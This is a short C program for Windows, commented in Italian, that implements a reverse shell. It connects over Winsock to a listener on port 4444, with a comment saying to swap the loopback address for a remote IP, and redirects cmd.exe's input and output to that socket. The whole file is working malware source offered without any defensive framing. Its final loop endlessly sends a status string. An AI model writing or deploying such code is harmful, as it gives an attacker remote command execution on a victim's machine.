#include <winsock2.h>
#include <windows.h>
#include <stdio.h>


#pragma comment(lib, "ws2_32")  // Link con Winsock2


int main()
{
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;

    // 1. Inizializza Winsock
    WSAStartup(MAKEWORD(2, 2), &wsa);

    // 2. Crea il socket
    sock = socket(AF_INET, SOCK_STREAM, 0);

    // 3. Imposta IP e porta del server
    server.sin_family = AF_INET;
    server.sin_port = htons(4444); // Netcat in ascolto
    server.sin_addr.s_addr = inet_addr("127.0.0.1"); // Cambia con IP remoto

    // 4. Connessione
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) != 0) {
        return 1;
    }

    // 5. Redirezione input/output verso il socket
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // 6. Esegui cmd.exe
    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("Errore nella creazione del processo: %lu\n", GetLastError());
        return EXIT_FAILURE;
    }
    while (1) {
        send(sock, "Shell attiva\n", strlen("Shell attiva\n"), 0);
    }
    
    return EXIT_SUCCESS;
}